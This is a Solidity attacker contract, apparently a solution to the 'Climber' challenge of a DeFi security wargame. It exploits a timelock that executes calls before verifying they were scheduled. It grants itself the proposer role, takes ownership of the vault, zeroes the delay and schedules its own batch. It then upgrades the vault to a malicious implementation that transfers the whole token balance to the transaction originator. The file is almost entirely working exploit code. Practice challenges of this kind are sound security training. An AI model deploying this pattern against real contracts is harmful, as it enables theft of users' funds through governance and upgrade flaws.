// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol"; 
import "./ClimberVault.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "./ClimberConstants.sol";

contract ClimberTimelockAttacker {
    ClimberTimelock timelock;
    ClimberVault vault;
    address token;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, address _token) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
    }

    function attack() external {
        salt = keccak256("ATTACK_SALT");

        //grant proposer role to attacker contract for incoming schedule()
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)",PROPOSER_ROLE,address(this)));
        //transfer ownership of vault from timelock to attacker contract
        targets.push(address(vault));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", address(this)));
        //remove delay to allow all scheduled calls can be executed immediately
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
        //schedule all calls
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("schedule()"));

        timelock.execute(targets, values, dataElements, salt);

        //Only owner can upgrade smart contract
        ClimberVault2 newImplementation = new ClimberVault2();
        bytes memory data = abi.encodeWithSignature("drain(address)", token);
        vault.upgradeToAndCall(address(newImplementation), data);
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract ClimberVault2 is ClimberVault {
    function drain(address token) external {
        SafeTransferLib.safeTransfer(token, tx.origin, IERC20(token).balanceOf(address(this)));
    }
}